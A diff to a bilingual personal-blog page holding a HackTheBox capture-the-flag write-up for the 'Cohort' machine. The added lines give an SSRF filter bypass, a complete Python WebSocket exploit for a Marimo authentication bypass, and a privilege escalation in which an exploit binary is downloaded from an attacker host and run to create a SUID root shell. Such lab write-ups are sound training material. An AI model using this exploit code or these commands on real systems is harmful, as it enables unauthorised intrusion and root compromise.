@@ -26,7 +26,6 @@
       .avatar img { width: 42px; height: 42px; object-fit: cover; }
       .logo-text { color: #facc15; font-weight: 700; font-size: 1.1rem; text-decoration: none; }
       
-      /* Estilo para el botón de idioma en la cabecera */
       .lang-btn {
         background: transparent; border: 1px solid #facc15; color: #facc15;
         padding: 0.3rem 0.8rem; border-radius: 4px; cursor: pointer;
@@ -38,13 +37,14 @@
       h1, h2, h3 { color: #facc15; }
       h1 { font-size: 2rem; border-bottom: 1px solid #27272a; padding-bottom: 0.5rem; }
       h2 { font-size: 1.4rem; margin-top: 2.5rem; border-bottom: 1px solid #27272a; padding-bottom: 0.3rem; }
+      h3 { font-size: 1.1rem; margin-top: 1.5rem; }
       p, li { color: #a1a1aa; line-height: 1.6; }
       
       pre {
         background-color: #09090b; border: 1px solid #27272a;
         padding: 1rem; border-radius: 6px; overflow-x: auto;
         color: #f8fafc; font-family: 'Courier New', Courier, monospace;
-        font-size: 0.9rem;
+        font-size: 0.85rem;
       }
       code { color: #facc15; font-family: 'Courier New', Courier, monospace; }
       pre code { color: #e2e8f0; }
@@ -66,7 +66,6 @@
         </div>
         <a href="/" class="logo-text">brian-catala.github.io</a>
       </div>
-      <!-- Botón de selector de idioma idéntico al index -->
       <button id="lang-toggle" class="lang-btn">EN / ES</button>
     </header>
 
@@ -75,9 +74,8 @@
       
       <h1 data-en="Write-up: Cohort (HackTheBox)" data-es="Write-up: Cohort (HackTheBox)">Write-up: Cohort (HackTheBox)</h1>
       <p>
-        <strong data-en="Difficulty:" data-es="Dificultad:">Dificultad:</strong> <span data-en="Easy" data-es="Facil">Facil</span> | 
-        <strong data-en="Platform:" data-es="Plataforma:">Plataforma:</strong> HackTheBox | 
-        <strong data-en="OS:" data-es="OS:">OS:</strong> Linux
+        <strong data-en="Difficulty:" data-es="Dificultad:">Dificultad:</strong> <span data-en="Moderate / Difficult" data-es="Moderada / Difícil (según evaluación)">Moderada / Difícil (según evaluación)</span> | 
+        <strong data-en="Platform:" data-es="Plataforma:">Plataforma:</strong> HackTheBox
       </p>
       <p>
         <strong data-en="Objectives:" data-es="Objetivos:">Objetivos:</strong> 
@@ -88,64 +86,250 @@
       </p>
 
       <h2 data-en="1. Initial Reconnaissance and Enumeration" data-es="1. Reconocimiento y Enumeración Inicial">1. Reconocimiento y Enumeración Inicial</h2>
-      <p data-en="We begin by performing a port scan using nmap to identify exposed services on the target machine:" 
-         data-es="Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos:">
-        Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos:
+      <p data-en="We begin by performing a port scan using nmap to identify exposed services on the target machine (10.129.119.9):" 
+         data-es="Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos en la máquina objetivo (10.129.119.9):">
+        Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos en la máquina objetivo (10.129.119.9):
       </p>
       <pre><code>nmap -v -p- --open -T4 -sS -n -oX escaneo.xml 10.129.119.9</code></pre>
-      <p data-en="The scan reveals the following open ports:" data-es="El escaneo revela los siguientes puertos abiertos:">El escaneo revela los puertos:</p>
+      <p data-en="The scan reveals the following open ports:" data-es="El escaneo revela los siguientes puertos abiertos:">El escaneo revela los siguientes puertos abiertos:</p>
       <ul>
         <li><strong>22/tcp</strong> - SSH</li>
         <li><strong>80/tcp</strong> - HTTP</li>
         <li><strong>443/tcp</strong> - HTTPS</li>
       </ul>
-      <p data-en="We add the static resolution to the <code>/etc/hosts</code> file:" data-es="Añadimos la resolución estática al archivo <code>/etc/hosts</code>:">Añadimos la resolución estática al archivo <code>/etc/hosts</code>:</p>
+      <p data-en="Subsequently, we execute an exhaustive scan of scripts and version detection on the open ports:" 
+         data-es="Posteriormente, ejecutamos un escaneo exhaustivo de scripts de enumeración y detección de versiones sobre los puertos abiertos:">
+        Posteriormente, ejecutamos un escaneo exhaustivo de scripts de enumeración y detección de versiones sobre los puertos abiertos:
+      </p>
+      <pre><code>nmap -sV -sC -p22,80,443 10.129.119.9</code></pre>
+      <p data-en="Since the web service responds under a virtual domain, we add static resolution to the <code>/etc/hosts</code> file:" 
+         data-es="Dado que el servicio web responde bajo un dominio virtual, añadimos la resolución estática al archivo <code>/etc/hosts</code>:">
+        Dado que el servicio web responde bajo un dominio virtual, añadimos la resolución estática al archivo <code>/etc/hosts</code>:
+      </p>
       <pre><code>echo "10.129.119.9 cohort.htb" | sudo tee -a /etc/hosts</code></pre>
 
       <h2 data-en="2. Web Enumeration and SSRF Discovery" data-es="2. Enumeración Web y Hallazgo de SSRF">2. Enumeración Web y Hallazgo de SSRF</h2>
-      <p data-en="While interacting with the web application, we intercept a POST request to the <code>/api/validate</code> endpoint:" 
-         data-es="Al interactuar con la aplicación web, interceptamos una solicitud POST al endpoint <code>/api/validate</code>:">
-        Al interactuar con la aplicación web, interceptamos una solicitud POST al endpoint <code>/api/validate</code>:
+      <p data-en="While interacting with the web application and intercepting traffic in the network tab, we observe a test URL sent via a form with the following request structure:" 
+         data-es="Al interactuar con la aplicación web e interceptar el tráfico en la pestaña de red, se observa el envío de una URL de prueba a través de un formulario con la siguiente estructura de solicitud:">
+        Al interactuar con la aplicación web e interceptar el tráfico en la pestaña de red, se observa el envío de una URL de prueba a través de un formulario con la siguiente estructura de solicitud:
       </p>
       <pre><code>POST /api/validate HTTP/1.1
 Host: cohort.htb
 Content-Type: application/json
 
 { "url": "http://test.com/log.csv", "format": "csv" }</code></pre>
-      <p data-en="A filter is identified that rejects local addresses (blacklist). We test an SSRF bypass:" 
-         data-es="Se identifica un filtro que rechaza direcciones locales (blacklist). Probamos un bypass de SSRF:">
-        Se identifica un filtro que rechaza direcciones locales (blacklist). Probamos un bypass de SSRF:
+      <p data-en="The endpoint processes a JSON body with the parameters url and format, performing server-side requests to the specified resource." 
+         data-es="El endpoint procesa un cuerpo JSON con los parámetros url y format, realizando peticiones desde el lado del servidor hacia el recurso especificado.">
+        El endpoint procesa un cuerpo JSON con los parámetros url y format, realizando peticiones desde el lado del servidor hacia el recurso especificado.
       </p>
+
+      <h3 data-en="Filtering mechanism analysis" data-es="Análisis del mecanismo de filtrado">Análisis del mecanismo de filtrado</h3>
+      <p data-en="A filter is identified that explicitly rejects local or loopback addresses returning an error message ('not allowed'). This behavior denotes validation based on literal string blacklists (such as 127.0.0.1 or localhost) rather than robust IP resolution and validation. This allows evading the filter by using alternative loopback representations." 
+         data-es="Se identifica un filtro que rechaza explícitamente direcciones locales o de bucle invertido devolviendo un mensaje de error ('no permitido'). Este comportamiento denota una validación basada en listas de bloqueo (blacklist) de cadenas literales (como 127.0.0.1 o localhost) en lugar de una resolución y validación robusta de IPs. Esto permite evadir el filtro utilizando representaciones alternativas de la interfaz loopback.">
+        Se identifica un filtro que rechaza explícitamente direcciones locales o de bucle invertido devolviendo un mensaje de error ("no permitido"). Este comportamiento denota una validación basada en listas de bloqueo (blacklist) de cadenas literales (como 127.0.0.1 o localhost) en lugar de una resolución y validación robusta de IPs. Esto permite evadir el filtro utilizando representaciones alternativas de la interfaz loopback.
+      </p>
+      <p data-en="We test the first evasion vector using curl:" data-es="Probamos el primer vector de evasión mediante curl:">Probamos el primer vector de evasión mediante curl:</p>
       <pre><code>curl -s -k -X POST https://cohort.htb/api/validate \
   -H "Content-Type: application/json" \
   -d '{"url": "http://127.1/", "format": "csv"}'</code></pre>
+      <p data-en="Obtained response:" data-es="Respuesta obtenida:">Respuesta obtenida:</p>
+      <pre><code>{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<doctype html> ... <title>Cohort Analytics</title> ...", "message": "Source reachable."}</code></pre>
+      <p data-en="Validation is successful, confirming the existence of a Server-Side Request Forgery (SSRF) vulnerability." 
+         data-es="La validación es exitosa, confirmando la existencia de una vulnerabilidad de Server-Side Request Forgery (SSRF).">
+        La validación es exitosa, confirmando la existencia de una vulnerabilidad de Server-Side Request Forgery (SSRF).
+      </p>
 
-      <h2 data-en="3. Internal Services Discovery and Nginx (/status)" data-es="3. Descubrimiento de Servicios Internos y Nginx (/status)">3. Descubrimiento de Servicios Internos y Nginx (/status)</h2>
-      <p data-en="Querying the protected endpoint <code>/status</code> through the SSRF:" data-es="Consultando el endpoint protegido <code>/status</code> a través del SSRF:">Consultando el endpoint protegido <code>/status</code> a través del SSRF:</p>
+      <h2 data-en="3. SSRF Exploitation and Internal Services Discovery" data-es="3. Explotación de SSRF y Descubrimiento de Servicios Internos">3. Explotación de SSRF y Descubrimiento de Servicios Internos</h2>
+      <p data-en="Once SSRF is confirmed, we proceed to enumerate internal services exposed locally." 
+         data-es="Una vez confirmado el SSRF, procedemos a enumerar servicios internos expuestos localmente.">
+        Una vez confirmado el SSRF, procedemos a enumerar servicios internos expuestos localmente.
+      </p>
+
+      <h3 data-en="Port 5000 Exploration" data-es="Exploración del puerto 5000">Exploración del puerto 5000</h3>
+      <pre><code>curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.1:5000/", "format": "csv"}'</code></pre>
+      <p data-en="Response:" data-es="Respuesta:">Respuesta:</p>
+      <pre><code>{ "ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{ \"ok\": false, \"message\": \"Método no permitido.\" }", "message": "La fuente respondió con un estado de error." }</code></pre>
+      <p data-en="Port 5000 corresponds to the API's own backend, which rejects requests via unsupported methods (such as direct GET)." 
+         data-es="El puerto 5000 corresponde al backend de la propia API, el cual rechaza peticiones mediante métodos no soportados (como GET directo).">
+        El puerto 5000 corresponde al backend de la propia API, el cual rechaza peticiones mediante métodos no soportados (como GET directo).
+      </p>
+
+      <h3 data-en="Port 8888 Exploration" data-es="Exploración del puerto 8888">Exploración del puerto 8888</h3>
+      <pre><code>curl -s -k -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://127.1:8888/", "format": "csv"}'</code></pre>
+      <p data-en="Response: The application responds with a title pointing to Marimo (&lt;title&gt;marimo&lt;/title&gt;), an interactive Python notebook environment, protected by an authentication panel requiring an access token or password." 
+         data-es="Respuesta: La aplicación responde con un título que apunta a Marimo (&lt;title&gt;marimo&lt;/title&gt;), un entorno de cuadernos interactivos en Python (Python notebooks), protegido por un panel de autenticación que requiere un token de acceso o contraseña.">
+        Respuesta: La aplicación responde con un título que apunta a Marimo (&lt;title&gt;marimo&lt;/title&gt;), un entorno de cuadernos interactivos en Python (Python notebooks), protegido por un panel de autenticación que requiere un token de acceso o contraseña.
+      </p>
+
+      <h3 data-en="Fuzzing and Nginx Configuration Exposure (/status)" data-es="Fuzzing y Exposición de Configuración de Nginx (/status)">Fuzzing y Exposición de Configuración de Nginx (/status)</h3>
+      <p data-en="Reviewing the main site directories, we detect that the /status route returns a 403 Forbidden status code, which usually denotes Nginx Access Control List (ACL) restrictions. We query this resource via SSRF:" 
+         data-es="Revisando los directorios del sitio principal, se detecta que la ruta /status devuelve un código de estado 403 Forbidden, lo cual suele denotar restricciones de control de acceso (ACL) de Nginx. Mediante el SSRF consultamos dicho recurso:">
+        Revisando los directorios del sitio principal, se detecta que la ruta /status devuelve un código de estado 403 Forbidden, lo cual suele denotar restricciones de control de acceso (ACL) de Nginx. Mediante el SSRF consultamos dicho recurso:
+      </p>
       <pre><code>curl -s -k -X POST https://cohort.htb/api/validate \
   -H "Content-Type: application/json" \
   -d '{"url": "http://127.1/status", "format": "csv"}'</code></pre>
-      <p data-en="This reveals a hidden Virtual Host: <code>nb-1be3782a8afd3ad5.cohort.htb</code> pointing to port 8888 (Marimo)." 
-         data-es="Esto revela un Virtual Host oculto: <code>nb-1be3782a8afd3ad5.cohort.htb</code> que apunta al puerto 8888 (Marimo).">
-        Esto revela un Virtual Host oculto: <code>nb-1be3782a8afd3ad5.cohort.htb</code> que apunta al puerto 8888 (Marimo).
+      <p data-en="Structured response (JSON):" data-es="Respuesta estructurada (JSON):">Respuesta estructurada (JSON):</p>
+      <pre><code>{ 
+  "service": "cohort-edge", 
+  "status": "ok", 
+  "generated_by": "nginx", 
+  "upstreams": [ 
+    { "name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort" }, 
+    { "name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000" }, 
+    { "name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "espacio de trabajo interno para analistas, no para uso externo" } 
+  ] 
+}</code></pre>
+      <p data-en="The response reveals a hidden internal Virtual Host: nb-1be3782a8afd3ad5.cohort.htb, which acts as a reverse proxy to the Marimo instance on port 8888. We add this subdomain to our /etc/hosts:" 
+         data-es="La respuesta revela un Virtual Host interno oculto: nb-1be3782a8afd3ad5.cohort.htb, el cual actúa como proxy inverso hacia la instancia de Marimo en el puerto 8888. Añadimos este subdominio a nuestro /etc/hosts:">
+        La respuesta revela un Virtual Host interno oculto: nb-1be3782a8afd3ad5.cohort.htb, el cual actúa como proxy inverso hacia la instancia de Marimo en el puerto 8888. Añadimos este subdominio a nuestro /etc/hosts:
       </p>
+      <pre><code>echo "10.129.119.9 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts</code></pre>
 
       <h2 data-en="4. Marimo Exploitation (CVE-2026-39987)" data-es="4. Explotación de Marimo (CVE-2026-39987)">4. Explotación de Marimo (CVE-2026-39987)</h2>
-      <p data-en="Pre-authentication bypass is exploited in the WebSocket path <code>/terminal/ws</code> to obtain an interactive shell without credentials." 
-         data-es="Se explota la omisión de autenticación previa en la ruta WebSocket <code>/terminal/ws</code> para obtener una consola interactiva sin credenciales.">
-        Se explota la omisión de autenticación previa en la ruta WebSocket <code>/terminal/ws</code> para obtener una consola interactiva sin credenciales.
+      <p data-en="Upon accessing the discovered subdomain, we encounter the Marimo login interface. Investigating software vulnerabilities, we identify CVE-2026-39987, a pre-authentication bypass flaw where the validate_auth() function omits required access controls specifically on the WebSockets endpoint (/terminal/ws), allowing any client to interact directly with the console without valid credentials after completing the handshake protocol." 
+         data-es="Al acceder al subdominio descubierto, nos encontramos con la interfaz de inicio de sesión de Marimo. Investigando sobre vulnerabilidades en este software, identificamos el CVE-2026-39987, una falla de omisión de autenticación previa (pre-authentication bypass) donde la función validate_auth() omite los controles de acceso requeridos específicamente en el endpoint de WebSockets (/terminal/ws), permitiendo a cualquier cliente interactuar directamente con la consola sin credenciales válidas tras completar el protocolo de enlace (handshake).">
+        Al acceder al subdominio descubierto, nos encontramos con la interfaz de inicio de sesión de Marimo. Investigando sobre vulnerabilidades en este software, identificamos el CVE-2026-39987, una falla de omisión de autenticación previa (pre-authentication bypass) donde la función validate_auth() omite los controles de acceso requeridos específicamente en el endpoint de WebSockets (/terminal/ws), permitiendo a cualquier cliente interactuar directamente con la consola sin credenciales válidas tras completar el protocolo de enlace (handshake).
       </p>
 
+      <h3 data-en="WebSocket Exploitation Script" data-es="Script de Explotación de WebSocket">Script de Explotación de WebSocket</h3>
+      <p data-en="We develop the following Python script to interact with the WebSocket and execute system commands:" 
+         data-es="Desarrollamos el siguiente script en Python para interactuar con el WebSocket y ejecutar comandos en el sistema:">
+        Desarrollamos el siguiente script en Python para interactuar con el WebSocket y ejecutar comandos en el sistema:
+      </p>
+      <pre><code>import socket, ssl, base64, os, struct, time, select 
+
+TARGET_IP = "10.129.119.9" 
+HOST = "nb-1be3782a8afd3ad5.cohort.htb" 
+PATH = "/terminal/ws"
+
+def connect(): 
+    raw = socket.create_connection((TARGET_IP, 443), timeout=5) 
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) 
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    s = ctx.wrap_socket(raw, server_hostname=HOST) 
+    key = base64.b64encode(os.urandom(16)).decode() 
+    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
+           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n") 
+    s.sendall(req.encode()) 
+    s.settimeout(5) 
+    resp = b"" 
+    while b"\r\n\r\n" not in resp: 
+        resp += s.recv(4096) 
+    print("[+] Handshake response:") 
+    print(resp.decode(errors="replace")) 
+    return s 
+
+def send_text(s, text): 
+    payload = text.encode() 
+    mask = os.urandom(4) 
+    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload)) 
+    length = len(payload) 
+    if length <= 125: 
+        header = struct.pack("!BB", 0x81, 0x80 | length) 
+    elif length <= 65535: 
+        header = struct.pack("!BBH", 0x81, 0x80 | 126, length) 
+    else: 
+        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length) 
+    s.sendall(header + mask + masked) 
+
+def recv_frames(s, duration=3): 
+    end = time.time() + duration 
+    buf = b"" 
+    out = b"" 
+    while time.time() < end: 
+        r, _, _ = select.select([s], [], [], 0.5) 
+        if r: 
+            try: 
+                chunk = s.recv(4096) 
+            except (socket.timeout, ssl.SSLWantReadError): 
+                continue 
+            if not chunk: 
+                break
+            buf += chunk 
+    while len(buf) >= 2: 
+        b1 = buf[1] 
+        masked = b1 & 0x80
+        plen = b1 & 0x7F
+        idx = 2 
+        if plen == 126: 
+            if len(buf) < 4: break
+            plen = struct.unpack("!H", buf[2:4])[0]; idx = 4
+        elif plen == 127: 
+            if len(buf) < 10: break
+            plen = struct.unpack("!Q", buf[2:10])[0]; idx = 10 
+        if masked: 
+            if len(buf) < idx + 4: break
+            mask_key = buf[idx:idx + 4]; idx += 4 
+        else: 
+            mask_key = None 
+        if len(buf) < idx + plen: break
+        payload = buf[idx:idx + plen] 
+        if mask_key: 
+            payload = bytes(c ^ mask_key[i % 4] for i, c in enumerate(payload)) 
+        out += payload 
+        buf = buf[idx + plen:] 
+    return out 
+
+if __name__ == "__main__": 
+    import sys 
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
+    s = connect() 
+    print(recv_frames(s, 3).decode(errors="replace")) 
+    send_text(s, cmd + "\r") 
+    print(recv_frames(s, 4).decode(errors="replace"))</code></pre>
+      <p data-en="We run the script to verify access and read the user flag (user.txt):" 
+         data-es="Ejecutamos el script para verificar el acceso y leer la flag de usuario (user.txt):">
+        Ejecutamos el script para verificar el acceso y leer la flag de usuario (user.txt):
+      </p>
+      <pre><code>python3 marimo_exploit.py "cat /home/marimo/user.txt"</code></pre>
+
       <h2 data-en="5. Privilege Escalation: Pack2TheRoot (CVE-2026-41651)" data-es="5. Escalada de Privilegios: Pack2TheRoot (CVE-2026-41651)">5. Escalada de Privilegios: Pack2TheRoot (CVE-2026-41651)</h2>
-      <p data-en="A vulnerable version of PackageKit (1.0.2 - 1.3.4) is detected. After transferring the exploit and winning a race condition, we manage to spawn a SUID bash and obtain <code>root</code> privileges." 
-         data-es="Se detecta una versión vulnerable de PackageKit (1.0.2 - 1.3.4). Tras transferir el exploit y ganar una condición de carrera (race condition), logramos generar una bash con SUID y obtener privilegios de <code>root</code>.">
-        Se detecta una versión vulnerable de PackageKit (1.0.2 - 1.3.4). Tras transferir el exploit y ganar una condición de carrera (race condition), logramos generar una bash con SUID y obtener privilegios de <code>root</code>.
+      <p data-en="Once inside the system with marimo user privileges, we perform standard post-exploitation reconnaissance tasks. The sudo -l command requires a password we do not possess, and reviewing SUID binaries or cron jobs reveals no immediate vectors. However, auditing installed system packages via the package manager, we observe the following:" 
+         data-es="Una vez dentro del sistema con privilegios del usuario marimo, realizamos las tareas habituales de reconocimiento post-explotación. El comando sudo -l requiere una contraseña que no poseemos, y la revisión de binarios SUID o tareas cron no arroja vectores inmediatos. Sin embargo, al auditar los paquetes instalados en el sistema mediante el gestor de paquetes, observamos lo siguiente:">
+        Una vez dentro del sistema con privilegios del usuario marimo, realizamos las tareas habituales de reconocimiento post-explotación. El comando sudo -l requiere una contraseña que no poseemos, y la revisión de binarios SUID o tareas cron no arroja vectores inmediatos. Sin embargo, al auditar los paquetes instalados en el sistema mediante el gestor de paquetes, observamos lo siguiente:
+      </p>
+      <pre><code>python3 marimo_exploit.py "dpkg -l | grep -i packagekit; which dpkg-deb; dbus-send --version"</code></pre>
+      <p data-en="PackageKit versions between 1.0.2 and 1.3.4 are vulnerable to CVE-2026-41651, popularly known as 'Pack2TheRoot'." 
+         data-es="Las versiones de PackageKit comprendidas entre la 1.0.2 y la 1.3.4 son vulnerables a CVE-2026-41651, conocida popularmente como 'Pack2TheRoot'.">
+        Las versiones de PackageKit comprendidas entre la 1.0.2 y la 1.3.4 son vulnerables a CVE-2026-41651, conocida popularmente como "Pack2TheRoot".
+      </p>
+
+      <h3 data-en="Exploitation Methodology:" data-es="Metodología de Explotación:">Metodología de Explotación:</h3>
+      <p data-en="<strong>Exploit binary transfer:</strong> On our attacker machine, we spin up a temporary HTTP server:" 
+         data-es="<strong>Transferencia del binario del exploit:</strong> En nuestra máquina de atacante, levantamos un servidor temporal HTTP:">
+        <strong>Transferencia del binario del exploit:</strong> En nuestra máquina de atacante, levantamos un servidor temporal HTTP:
+      </p>
+      <pre><code>python3 -m http.server 8080</code></pre>
+      <p data-en="We transfer the compiled binary to the victim's temporary directory:" data-es="Transferimos el binario compilado al directorio temporal de la víctima:">Transferimos el binario compilado al directorio temporal de la víctima:</p>
+      <pre><code>python3 marimo_exploit.py "curl -s -o /tmp/exploit.bin http://&lt;IP_ATACANTE&gt;:8080/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin"</code></pre>
+      
+      <p data-en="<strong>Background Execution (Race Condition):</strong> Because exploitation requires a runtime longer than a simple synchronous request to manipulate the race condition, we execute the exploit in the background redirecting output:" 
+         data-es="<strong>Ejecución en segundo plano (Race Condition):</strong> Debido a que la explotación requiere un tiempo de ejecución superior al de una simple solicitud síncrona para manipular la condición de carrera (race condition), ejecutamos el exploit en segundo plano redirigiendo la salida:">
+        <strong>Ejecución en segundo plano (Race Condition):</strong> Debido a que la explotación requiere un tiempo de ejecución superior al de una simple solicitud síncrona para manipular la condición de carrera (race condition), ejecutamos el exploit en segundo plano redirigiendo la salida:
+      </p>
+      <pre><code>python3 marimo_exploit.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo iniciado"</code></pre>
+      
+      <p data-en="<strong>Verification and Superuser Privilege Acquisition:</strong> After a few seconds of waiting, we check the logs and the generation of the resulting SUID shell:" 
+         data-es="<strong>Verificación y obtención de privilegios de Superusuario:</strong> Tras unos segundos de espera, comprobamos los logs y la generación de la shell SUID resultante:">
+        <strong>Verificación y obtención de privilegios de Superusuario:</strong> Tras unos segundos de espera, comprobamos los logs y la generación de la shell SUID resultante:
+      </p>
+      <pre><code>python3 marimo_exploit.py "cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1"</code></pre>
+      
+      <p data-en="Once the process is successfully completed, we proceed to invoke bash with root privileges to read the final flag (root.txt). System fully compromised!" 
+         data-es="Una vez completado el proceso con éxito, procedemos a invocar la bash con privilegios de root para leer la flag definitiva (root.txt). ¡Sistema comprometido por completo!">
+        Una vez completado el proceso con éxito, procedemos a invocar la bash con privilegios de root para leer la flag definitiva (root.txt). ¡Sistema comprometido por completo!
       </p>
       
       <a href="/" class="back-btn" style="margin-top: 3rem;" data-en="← Back to home" data-es="← Volver al inicio">← Volver al inicio</a>
     </main>
 
-    <!-- Script idéntico para alternar idiomas -->
     <script>
       const langToggle = document.getElementById('lang-toggle');
       let currentLang = localStorage.getItem('site-lang') || 'es';
